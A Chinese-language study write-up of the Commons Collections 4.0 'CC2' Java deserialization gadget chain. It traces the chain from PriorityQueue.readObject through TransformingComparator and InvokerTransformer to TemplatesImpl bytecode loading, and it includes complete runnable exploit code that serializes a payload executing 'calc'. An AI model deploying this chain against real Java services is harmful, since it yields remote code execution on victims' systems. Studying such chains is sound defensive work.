# CC2链分析

## CC2链总流程概述

CC2 链是 Commons Collections 反序列化漏洞利用链中的一种，适用于 Apache Commons Collection 4.0 版本。以下是其入口、触发链和执行点的详细介绍：

- **入口**：CC2 链的入口是`PriorityQueue`类的`readObject`方法。`PriorityQueue`是一个基于优先级的无界优先级队列，在反序列化过程中，会调用`readObject`方法，该方法中会调用`heapify`函数，将无序数组`queue`的内容还原为二叉堆，`heapify`函数又会循环调用`siftDown`方法，根据是否存在比较器，进入不同的比较方法，若存在比较器则会进入`siftDownUsingComparator`方法，最终调用比较器的`compare`方法。
- **触发链**：触发链涉及`TransformingComparator`类和`InvokerTransformer`类。首先创建一个`InvokerTransformer`对象，并传递一个`newTransformer`方法名。然后将`InvokerTransformer`对象传递给`TransformingComparator`类的构造函数，创建`TransformingComparator`对象。接着通过反射构造`PriorityQueue`队列，将其`comparator`字段设置为`TransformingComparator`对象，`queue`字段设置为包含恶意字节码的`TemplatesImpl`对象。当`PriorityQueue`进行反序列化时，会触发`comparator`的`compare`方法，即`TransformingComparator`的`compare`方法，进而调用`InvokerTransformer`的`transform`方法。
- **执行点**：执行点是`TemplatesImpl`类的`defineTransletClasses`方法。`InvokerTransformer`的`transform`方法会调用`TemplatesImpl`对象的`newTransformer`方法，`newTransformer`方法又会调用`getTransletInstance`方法，该方法最终会调用`defineTransletClasses`方法。`defineTransletClasses`方法会通过字节码实例化对象，如果控制了`TemplatesImpl`对象的`_bytecodes`属性（其中存储了恶意字节码），那么在实例化对象的过程中，就会执行恶意代码，实现命令执行。

## 前置知识

### Javaassist 

Javaassist 是一个用于处理 Java 字节码的开源库，它提供了一种更简单、更直观的方式来操作 Java 类文件，无需深入了解复杂的字节码指令集。它允许开发者在运行时动态创建、修改类，或者在编译后但加载前修改已有的类文件。

而 `ClassPool` 是 Javaassist 中的一个核心类，它主要负责管理类的定义（`CtClass` 对象），可以看作是一个类的容器或注册表。

### `ClassPool` 的主要功能和特点：

1. **类的存储与管理**：`ClassPool` 会缓存已经加载或创建的 `CtClass`（Compile-Time Class）对象，避免重复加载，提高效率。

2. 类的查找与获取get()方法可以从ClassPool 中获取指定类的CtClass对象，例如：

   ```java
   ClassPool pool = ClassPool.getDefault();
   CtClass ctClass = pool.get("com.example.MyClass");
   ```

3. **类路径管理**：`ClassPool` 维护着类搜索路径，类似于 JVM 的类加载路径。可以通过 `appendClassPath()`、`insertClassPath()` 等方法添加自定义的类路径，确保能找到需要处理的类。

4. 创建新类：使用makeClass()方法可以在ClassPool中创建全新的类，例如：

   ```java
   CtClass newClass = pool.makeClass("com.example.NewClass");
   ```

### 代码演示

```java
package CC2;

import javassist.*;

import java.io.IOException;
import java.util.Arrays;

public class javassistDemo {
    public static void main(String[] args) throws CannotCompileException, IOException {
        // 获取默认的类池，用于创建和修改类
        ClassPool pool = ClassPool.getDefault();

        // 创建一个新的类，类名为"test"
        CtClass ctClass = pool.makeClass("test");

        // 创建一个私有整型字段"a"
        CtField ctField = CtField.make("private int a;", ctClass);
        // 将字段添加到类中
        ctClass.addField(ctField);

        // 创建一个公共方法testMethod()
        CtMethod ctMethod = CtMethod.make("public void testMethod(){}", ctClass);
        // 设置方法体，输出"Hello World!"
        ctMethod.setBody("System.out.println(\"Hello World!\");");
        // 将方法添加到类中
        ctClass.addMethod(ctMethod);

        // 创建一个带参数的构造函数，接受一个int类型的参数
        //CtConstructor ctConstructor = new CtConstructor(new CtClass[]{ctClass.intType}, ctClass);
        // 将构造函数添加到类中
        //ctConstructor.setBody("{this.a = $1;}");
        // ctClass.addConstructor(ctConstructor);

        // 创建类的静态初始化块
        CtConstructor ctConstructor1 = ctClass.makeClassInitializer();
        // 设置静态初始化块的内容，执行系统命令"calc"
        ctConstructor1.setBody("Runtime.getRuntime().exec(\"calc\");");

        // 将类转换为字节数组
        byte[] bytes = ctClass.toBytecode();
        // 输出字节数组的内容
        System.out.println(Arrays.toString(bytes));

        // 将生成的类写入到指定目录下的.class文件中
        ctClass.writeFile("src/main/java/CC2");
    }
}
```

### ClassLoader

在ClassLoader中有一个defineClass方法

```java
    protected final Class<?> defineClass(byte[] b, int off, int len)
        throws ClassFormatError
    {
        return defineClass(null, b, off, len, null);
    }
```

作用:

- 定义类: 将字节数组中的字节码数据转换为 Class 对象
- 类加载过程: 这是类加载器的核心方法之一，负责将二进制字节流解析成 JVM 中的类

这个方法是protected的. 写一个方法继承ClassLoader.

然后写一个方法对父类的ClassLoader.defineClass()进行调用

```java
public class defineClassDemo extends ClassLoader{
    
    /**
     * 构造方法
     * @param parent 父类加载器，用于委托加载机制
     */
    public defineClassDemo(ClassLoader parent){
        super(parent);
    }

    /**
     * 自定义的类定义方法
     * 将字节数组中的字节码转换为Class对象
     * 
     * @param b 包含类字节码的字节数组
     * @return 通过字节码定义的Class对象
     * @throws ClassFormatError 当字节码格式不正确时抛出此异常
     */
    protected final Class<?> mydefineClass(byte[] b) throws ClassFormatError {
        // 调用父类ClassLoader的defineClass方法
        // 参数说明:
        // b: 字节码数组
        // 0: 起始偏移量
        // b.length: 字节码数据长度
        return super.defineClass(b, 0, b.length);
    }

}

```

自定义类加载: 通过mydefineClass方法提供了简化版的类定义接口，可以直接从字节数组创建Class对象

然后在javassistDemo中添加

```java
        defineClassDemo defineClassDemo = new defineClassDemo(ClassLoader.getSystemClassLoader());
//        ClassLoader.getSystemClassLoader() 是 Java 提供的静态方法，用于获取应用程序的类加载器
//        系统类加载器（Application ClassLoader）是类加载器层次结构中的顶层应用程序类加载器，它负责加载：
        Class<?> aClass = defineClassDemo.mydefineClass(bytes);
        aClass.newInstance();
```

就可以执行计算器了

### 逻辑分析

#### 1. [javassistDemo](file://S:\code\Java\sec_study\Chains\CC_chains\CC2\src\main\java\CC2\javassistDemo.java#L7-L53) 类的执行流程

1. **使用 Javassist 创建动态类**：
   - 通过 `ClassPool.getDefault()` 获取类池
   - 使用 `pool.makeClass("test")` 创建名为 "test" 的新类
   - 添加私有字段 `private int a`
   - 添加公共方法 `testMethod()`，输出 "Hello World!"
   - 创建静态初始化块，其中包含恶意代码

2. **关键恶意代码注入**：
   ```java
   CtConstructor ctConstructor1 = ctClass.makeClassInitializer();
   ctConstructor1.setBody("Runtime.getRuntime().exec(\"calc\");");
   ```

   这段代码在类的静态初始化块中插入了执行系统命令的代码。

3. **生成字节码并加载**：
   - 使用 `ctClass.toBytecode()` 将构造的类转换为字节数组
   - 创建 `defineClassDemo` 实例
   - 调用 `defineClassDemo.mydefineClass(bytes)` 加载生成的类
   - 通过 `aClass.newInstance()` 实例化类

#### 2. `defineClassDemo` 类的作用

- 继承 `ClassLoader`，提供自定义类加载功能
- `mydefineClass` 方法封装了 `defineClass` 方法，简化了从字节数组加载类的过程
- 使得可以动态加载运行时生成的恶意类

#### 3. 为什么弹出计算器

当执行 `aClass.newInstance()` 时：

1. JVM 需要初始化这个新加载的类
2. 类初始化过程中会执行静态初始化块（static initializer block）
3. 静态初始化块中包含的代码 `Runtime.getRuntime().exec("calc");` 被执行
4. 这条语句调用操作系统命令启动计算器程序（Windows 系统中 `calc` 命令打开计算器）



## 执行点分析

### Templates

#### newTransformer

Templates类中有newTransformer方法,如下

```java
/**
 * 创建一个新的Transformer实例
 * @return Transformer实例
 * @throws TransformerConfigurationException 如果配置转换器时发生错误
 */
public synchronized Transformer newTransformer()
    throws TransformerConfigurationException
{
    // 声明一个TransformerImpl变量，这是Transformer的具体实现类
    TransformerImpl transformer;

    // 创建一个新的TransformerImpl实例，传入以下参数：
    // 1. getTransletInstance() - 获取translet实例(实际执行转换逻辑的类)
    // 2. _outputProperties - 输出属性配置
    // 3. _indentNumber - 缩进数量
    // 4. _tfactory - 父级TransformerFactory
    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
        _indentNumber, _tfactory);
.....................................
}
```

newTransformer方法中调用了getTransletInstance()方法. 跟进getTransletInstance()方法查看

#### getTransletInstance

```java
private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setOverrideDefaultParser(_overrideDefaultParser);
            translet.setAllowedProtocols(_accessExternalStylesheet);
           ...................................
        }   
    }
```

在这个代码程序往下走, 需要_name不为null(条件1)

然后执行`if (_class == null) defineTransletClasses();`, 跟进`defineTransletClasses()`

#### defineTransletClasses

```java
// 私有方法，用于定义Translet类，可能抛出TransformerConfigurationException异常
private void defineTransletClasses()
        throws TransformerConfigurationException {

    // 检查_bytecodes字段是否为空，如果为空则抛出异常
    if (_bytecodes == null) {
        // 创建错误信息对象
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        // 抛出配置异常
        throw new TransformerConfigurationException(err.toString());
    }

    // 创建TransletClassLoader类加载器实例，使用特权操作确保安全访问
    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            // 特权操作的具体实现
            public Object run() {
                // 返回新的TransletClassLoader实例
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
            }
        });

    try {
        // 获取字节码数组的长度
        final int classCount = _bytecodes.length;
        // 初始化_class数组，用于存储加载的类
        _class = new Class[classCount];

        // 如果有多个类，初始化辅助类映射
        if (classCount > 1) {
            _auxClasses = new HashMap<>();
        }

        // 遍历所有字节码数组
        for (int i = 0; i < classCount; i++) {
            // 使用自定义类加载器将字节码转换为Class对象
            _class[i] = loader.defineClass(_bytecodes[i]);
            // 获取当前类的父类
            final Class superClass = _class[i].getSuperclass();

            // 检查这是否是主类(继承自ABSTRACT_TRANSLET)
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                // 设置主translet类的索引
                _transletIndex = i;
            }
            else {
                // 将辅助类放入辅助类映射中
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }
        ................
}

```

这个方法里面程序要往下执行,需要满足`_bytecodes`不为null.(条件2)

然后执行

```java
TransletClassLoader loader = (TransletClassLoader)
    AccessController.doPrivileged(new PrivilegedAction() {
        // 特权操作的具体实现
        public Object run() {
            // 返回新的TransletClassLoader实例
            return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
        }
    });
```

在 CC2 反序列化漏洞利用链中，这段代码通过特权操作创建 `TransletClassLoader` 类加载器，为后续加载恶意的 `Translet` 实现类铺平了道路。一旦恶意类被成功加载，JVM 就会执行其中的恶意代码

然后

```java
 final int classCount = _bytecodes.length;
        // 初始化_class数组，用于存储加载的类
        _class = new Class[classCount];

        // 如果有多个类，初始化辅助类映射
        if (classCount > 1) {
            _auxClasses = new HashMap<>();
        }
```

在TemplatesImpl中`_bytecodes`定义为二维数组

```java
javaprivate byte[][] _bytecodes = null;
```

而这个值是我们控制传入的. `classCount`值就为`1`

`_class = new Class[classCount];`创建一个`new Class[1]`的数组.

classCount > 1不符合, `_auxClasses = new HashMap<>();`不执行

然后进入for循环

```java
for (int i = 0; i < classCount; i++) {
    _class[i] = loader.defineClass(_bytecodes[i]);
    final Class superClass = _class[i].getSuperclass();

    // Check if this is the main class
    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
        _transletIndex = i;
    }
    else {
        _auxClasses.put(_class[i].getName(), _class[i]);
    }
}
```

classCount=1, 执行

然后`defineClass(_bytecodes[i])`将传入字节码转换为Java类对象。

继续跟进, 因为后面`getTransletInstance`中`newInstance`执行需要`_transletIndex`不小于0. 

所以

```java
 if (superClass.getName().equals(ABSTRACT_TRANSLET)) {  //uperClass.getName():,获取当前类的父类的全限定名
     //.equals(ABSTRACT_TRANSLET):将父类名称与ABSTRACT_TRANSLET常量进行比较, 这个条件需要满足
        _transletIndex = i;
    }
```

让`_transletIndex=0`. 然后后面这个方法的执行与CC2无关, 回到`getTransletInstance`中

执行完`if (_class == null) defineTransletClasses();`后执行

`AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();`

调用触发了`newInstance`. 实列化对象,执行执行流程. 

然后`TemplatesImpl.newTransformer`是由`InvokerTransformer`.`transform`方法触发的

### 代码

```java
package lazyMapDemo;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.NotFoundException;
import java.lang.reflect.Field;
public class CC2 {
    public static void main(String[] args) throws Exception {
        // 使用Javassist创建恶意类
        ClassPool pool = ClassPool.getDefault();
        // 获取AbstractTranslet类作为父类
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        // 创建名为"Calc"的恶意类
        CtClass cc=pool.makeClass("Calc");
        // 设置父类为AbstractTranslet
        cc.setSuperclass(superClass);

        // 创建类的静态初始化块，插入恶意代码
        CtConstructor constructor=cc.makeClassInitializer();
        // 在静态初始化块中执行系统命令打开计算器
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");

        // 将恶意类转换为字节码
        byte[] bytecode=cc.toBytecode();

        // 创建TemplatesImpl对象用于触发恶意代码执行
        TemplatesImpl templates=new TemplatesImpl();
        Class<? extends TemplatesImpl> aClass = templates.getClass();

        // 使用反射设置TemplatesImpl的_name字段
        Field name = aClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"Calc");

        // 使用反射设置TemplatesImpl的_bytecodes字段，注入恶意字节码
        Field bytecodes = aClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates,new byte[][]{bytecode});

        // 使用反射设置TemplatesImpl的_tfactory字段
        Field tfactory = aClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        // 调用newTransformer方法触发恶意代码执行
        // 这会触发调用链: newTransformer() -> getTransletInstance() -> defineTransletClasses() -> TransletClassLoader.defineClass()
        templates.newTransformer();
    }
}

```

触发计算器

## 触发链分析

### InvokerTransformer

通过`InvokerTransformer`的反射机制，间接调用`TemplatesImpl`的`newTransformer`方法

```java
InvokerTransformer newTransformer = new InvokerTransformer("newTransformer", null, null);
        newTransformer.transform(templates);
```

`templates`是我们实列化的`TemplatesImpl`对象,   `newTransformer.transform(templates);` 就会触发**`TemplatesImpl`**.**`newTransformer`**

然后看哪里触发`transform`

### **`TransformingComparator`**

实现了`Comparator`接口，在比较两个对象时，会先通过`Transformer`转换对象再比较。

在`TransformingComparator.compare`触发了`transform`. 

```java
  public int compare(final I obj1, final I obj2) {
        final O value1 = this.transformer.transform(obj1);
        final O value2 = this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
    }
```

在`InvokerTransformer`内部, 我们通过

```java
TransformingComparator transformingComparator = new TransformingComparator(newTransformer);
```

将`InvokerTransformer`传入到`InvokerTransformer`的`this.transformer `处,然后在`compare`触发`this.transformer.transform(obj1);`

即`InvokerTransformer.transform`发生

然后查看`compare`的触发,这个在入口点处的类中

## 入口点

CC2链的入口点是`PriorityQueue`类

查看他的`readObject`方法. 在反序列化的时候会触发这个方法, 在这个方法中触发了`heapify();`方法. 该方法中会调用`heapify`函数，将无序数组`queue`的内容还原为二叉堆，`heapify`函数又会循环调用`siftDown`方法，根据是否存在比较器，进入不同的比较方法，若存在比较器则会进入`siftDownUsingComparator`方法，最终调用比较器的`compare`方法。

所以在构造的时候需要**设置 `comparator`为 `TransformingComparator`**：

>  PriorityQueue queue = new PriorityQueue(2, new TransformingComparator(invokerTransformer));

然后**填充 `queue`数组**：确保程序中能执行到compare一步

```java
queue.add(templatesImpl);  // TemplatesImpl 包含恶意字节码
queue.add(templatesImpl);
```

这是因为:

- **如果 `queue`只有一个元素**：`size >>> 1 - 1`计算结果为 `0`（因为 `size=1`），所以会尝试对第一个元素（索引 `0`）进行 `siftDown`。但 `siftDown`在单元素情况下 **不会触发比较操作**（没有子节点可比较），导致漏洞链无法继续。

- **如果 `queue`有两个元素**：

  - `size=2`，`(size >>> 1) - 1 = 0`，仍然对索引 `0`进行 `siftDown`。

  - 但此时 `PriorityQueue`会检查其子节点（索引 `1`），并调用 `comparator.compare()`比较两个元素：

    ```
    if (right < size && comparator.compare((E) c, (E) queue[right]) > 0)
        c = queue[child = right];
    ```

  - **因此，必须至少有两个元素才能触发 `compare()`**。

  并且`compare()`必须接收两个参数（`obj1`和 `obj2`），所以 `queue`中至少要有两个元素。

```java
        InvokerTransformer newTransformer = new InvokerTransformer("newTransformer", null, null);
//        newTransformer.transform(templates);

        TransformingComparator transformingComparator = new TransformingComparator(newTransformer);
        transformingComparator.compare(templates,1);
```

至此构造完毕.接下来就是序列化和反序列化演示

## 完整代码演示

```java
package lazyMapDemo;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args) throws Exception {
        // ==================== 1. 生成恶意字节码（攻击载荷） ====================
        // 使用Javassist动态创建恶意类，这是攻击的核心载荷
        ClassPool pool = ClassPool.getDefault();
        // 必须继承AbstractTranslet，因为TemplatesImpl只加载该类的子类
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        CtClass cc = pool.makeClass("Calc"); // 恶意类名
        cc.setSuperclass(superClass); // 设置父类为AbstractTranslet

        // 静态代码块在类加载时自动执行，这里写入恶意命令（打开计算器）
        // 静态块是代码执行的关键位置，类加载时即触发
        CtConstructor constructor = cc.makeClassInitializer();
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");

        // 将恶意类编译为字节码，用于后续注入TemplatesImpl
        byte[] bytecode = cc.toBytecode();


        // ==================== 2. 构造恶意TemplatesImpl对象 ====================
        // TemplatesImpl是JDK中的类，其defineTransletClasses()方法会加载_bytecodes中的类
        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();

        // 设置_name字段：TemplatesImpl在加载类时要求_name不为null，否则会抛出异常
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true); // 突破私有字段访问限制
        nameField.set(templates, "Calc"); // 任意非null值即可

        // 注入恶意字节码：_bytecodes是二维数组，这里只需要一个恶意类，因此长度为1
        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        // 注意：必须用二维数组包裹，因为_bytecodes的类型是byte[][]
        bytecodesField.set(templates, new byte[][]{bytecode});

        // 设置_tfactory字段：TemplatesImpl的getTransletInstance()方法需要该字段不为null
        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());


        // ==================== 3. 构造触发链（连接入口与载荷） ====================
        // 3.1 创建InvokerTransformer：通过反射调用指定方法的工具类
        // 这里指定调用"newTransformer"方法（无参数），用于触发TemplatesImpl的代码加载逻辑
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);

        // 3.2 创建TransformingComparator：将比较器与Transformer结合
        // 其compare()方法会调用传入的Transformer的transform()方法
        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);

        // 3.3 创建PriorityQueue：反序列化的入口点
        // 构造函数指定初始容量和比较器（使用上面创建的transformingComparator）
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(2, transformingComparator);
        // 添加两个元素：PriorityQueue在序列化时会保存这些元素，反序列化时会对其排序
        priorityQueue.add(templates);
        priorityQueue.add(templates);

        // 反射修改PriorityQueue的内部数组：替换为恶意TemplatesImpl对象
        // 因为add()方法可能会触发提前排序，这里直接修改内部存储避免提前执行
        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        queueField.set(priorityQueue, new Object[]{templates, templates});


        // ==================== 4. 序列化与反序列化（触发漏洞） ====================
        // 序列化：将构造好的PriorityQueue写入文件，生成恶意序列化数据
        serialize(priorityQueue);
        System.out.println("序列化完成，生成test.ser文件");

        // 反序列化：读取恶意数据，触发整个调用链
        System.out.println("开始反序列化...");
        unserialize("test.ser");
    }

    /**
     * 序列化对象到文件
     * 作用：将构造好的恶意对象结构写入磁盘，模拟漏洞场景中的数据传输
     */
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("test.ser"));
        oos.writeObject(obj);
        oos.close();
    }

    /**
     * 从文件反序列化对象
     * 作用：触发漏洞利用链的起点，当读取恶意数据时，自动执行对象的readObject()方法
     */
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }


    // ==================== CC2链完整调用流程（反序列化时） ====================
    // 1. PriorityQueue.readObject()  // 反序列化入口，自动调用
    // 2. PriorityQueue.heapify()    // 重建堆结构
    // 3. PriorityQueue.siftDown()   // 调整堆元素位置
    // 4. TransformingComparator.compare()  // 使用自定义比较器
    // 5. InvokerTransformer.transform()    // 调用transform方法
    // 6. TemplatesImpl.newTransformer()    // 触发类加载流程
    // 7. TemplatesImpl.getTransletInstance()
    // 8. TemplatesImpl.defineTransletClasses()  // 加载_bytecodes中的恶意类
    // 9. 恶意类的静态代码块执行                // 最终执行恶意命令
}
    
```













